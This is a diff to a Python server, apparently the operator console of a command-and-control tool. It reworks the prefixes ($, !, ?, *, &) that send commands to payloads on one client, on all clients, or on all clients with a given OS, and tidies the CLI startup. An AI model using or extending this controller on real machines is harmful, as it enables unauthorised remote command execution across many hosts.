@@ -63,9 +63,9 @@ Send command options
 By default, commands are executed on the first payload on the currently connected client
 $command: $ before a command to execute command on all payloads on currently connected client 
 !command: ! before a command to execute command on first payload across all clients 
-?!command: ?! before a command to execute command to execute command on all payloads across all clients 
-&!command: &! before a command to execute the command on all payloads across all clients using a particular OS
-&command: & before a command to execute the command on first payload on all clients using a particular OS
+?command: ? before a command to execute command to execute command on all payloads across all clients 
+*command: * before a command to execute the command on first payload on all clients using a particular OS
+&command: & before a command to execute the command on all payloads across all clients using a particular OS
 
 User help 
 help: Show this message
@@ -310,49 +310,61 @@ The bytesize of the messages being sent between the server and client is 1024.
         ''' Function to handle checking send options '''
 
         try:
-            # / escapes send options
-            if command[0] == '/':
-                command: str = command[1:]
-                self.send_command(command, client_ip) # Send command to first payload for currently connected client as default
-                return True
-
-            # $command sends to all payloads for currently connected client
-            elif command[0] == '$':
-                command: str = command[1:]
-                self.send_command(command, client_ip, current_all=True)
-                return True
-        
-            # !command sends to all clients
-            elif command[0] == '!':
-                command: str = command[1:]
-                self.send_command(command, client_ip, all_clients=True)
-                return True
-
-            if len(command) > 1:
             
-                # ?!command sends to all payloads for all clients
-                if command[0] =='?' and command[1] == '!': # A genius admires simplicity while an idiot admires complexity
-                    command: str = command[2:]
-                    self.send_command(command, client_ip, all_clients_payloads=True)
+            # Commands which are one character
+            match command[0]:
+
+                # / escapes send options
+                case '/':
+                    if client_ip not in self.client_list.keys(): # Ensure current connected client is set
+                        logging.critical('Current connected client is not set')
+                        return True
+                    command: str = command[1:]
+                    self.send_command(command, client_ip) # Send command to first payload for currently connected client as default
+                    return True
+
+                # $command sends to all payloads for currently connected client
+                case '$':
+                    if client_ip not in self.client_list.keys(): # Ensure current connected client is set
+                        logging.critical('Current connected client is not set')
+                        return True
+                    command: str = command[1:]
+                    self.send_command(command, client_ip, current_all=True)
                     return True
         
-                    # &!command sends to all payloads on all clients using a given OS
-                elif command[0] == '&' and command[1] == '!': 
-                    command: str = command[2:]
+                # !command sends to first payload for all clients
+                case '!':
+                    command: str = command[1:]
+                    self.send_command(command, client_ip, all_clients=True)
+                    return True
+                
+                case '?': # A genius admires simplicity while an idiot admires complexity
+                    command: str = command[1:]
+                    self.send_command(command, client_ip, all_clients_payloads=True)
+                    return True
+                
+                # *command sends to first payload on all clients using a given OS
+                case '*': 
+                    command: str = command[1:]
+                    self.send_command(command, client_ip, all_OS=True)
+                    return True
+                
+                # &command sends to all payloads on all clients using a given OS
+                case '&': 
+                    command: str = command[1:]
                     self.send_command(command, client_ip, all_OS_payloads=True)
                     return True
         
-            # &command sends to first payload on all clients using a given OS
-            if command[0] == '&': # A genius admires simplicity while an idiot admires complexity
-                command: str = command[1:]
-                self.send_command(command, client_ip, all_OS=True)
-                return True
-        
-            # Send command to first payload for currently connected client as default
-            self.send_command(command, client_ip)
-            return True
+                # Send command to first payload for currently connected client as default
+                case _:
+                    if client_ip not in self.client_list.keys(): # Ensure current connected client is set
+                        logging.critical('Current connected client is not set')
+                        return True
+                    self.send_command(command, client_ip)
+                    return True
         except Exception as e: # Error should not happen here
-            logging.exception(f"Sending command failed:\n{e}") # Log error to console
+            logging.exception(f"Error sending command:\n{e}") # Log error to console
+            logging.critical('Sending command failed') 
             return True # Error should be handled gracefully 
 
     # Function to check if user has input a CLI/server command
@@ -742,21 +754,6 @@ The bytesize of the messages being sent between the server and client is 1024.
             # If not a CLI command return False
             case _:
                 return False
-        
-    # User connects to a client upon startup
-    def startupCLI(self) -> None:       
-        ''' Function to handle startup of the CLI '''
-
-        # While loop to not allow user to interact with CLI until they have connected to a valid client
-        while self.connected_client == None or self.connected_client not in self.client_list.keys():
-            client_ip: str = input(Fore.CYAN+"Enter client ip address to connect to: ").strip() # Nice 'candy' looking colour scheme
-            print(Fore.LIGHTMAGENTA_EX) # All text on the CLI is light magenta
-
-            if self.command_option(client_ip) == False: # Check if user has input a server command
-                if client_ip not in self.client_list.keys(): # Check if client is connected
-                    print("ERROR: client ip is not connected to server\n(If you are attempting to send a command to clients, please choose a targeted client first)")    
-                else:
-                    self.connected_client = client_ip
 
     # Control center for server communication to clients
     def CLI(self) -> None:
@@ -766,15 +763,13 @@ The bytesize of the messages being sent between the server and client is 1024.
         Handles communication with clients
         Choose a client you would like to access, and send commands to be executed by them
         '''
-
-        print(Fore.LIGHTMAGENTA_EX+"\nEnter 'help' to show all available CLI commands ")
-        self.startupCLI() # Start the CLI
+        print(Fore.LIGHTMAGENTA_EX+"\nEnter 'help' to show all available CLI commands ") 
 
         while True:
             # Ensure currently connected client is still connected to server
-            if self.connected_client not in self.client_list.keys():
+            if self.connected_client not in self.client_list.keys() and self.connected_client != None:
                 print(f'Currently connected client: {self.connected_client} has disconnected from the server')
-                self.startupCLI()
+                self.connected_client = None
                 
             # Take user input and carry out the given CLI command or send commands to client
             command: str = input(Fore.LIGHTGREEN_EX+"$ ").strip() # Nice looking shell
@@ -878,9 +873,8 @@ The bytesize of the messages being sent between the server and client is 1024.
         ''' Function to start the server '''
 
         try:
-            print(Fore.RED+logo) # Logo color red
-            print(Fore.RESET)
-            print(f'Host (your) ip:port - {self.host_ip}:{self.host_port}')
+            print(Fore.RED+logo+Fore.RESET) # Logo color red
+            print(Fore.CYAN+f'Host (your) ip:port - {self.host_ip}:{self.host_port}'+Fore.RESET)
             
             # Create and start new thread to connect new client to server
             connect_thread = threading.Thread(target=self.connect, daemon=True)
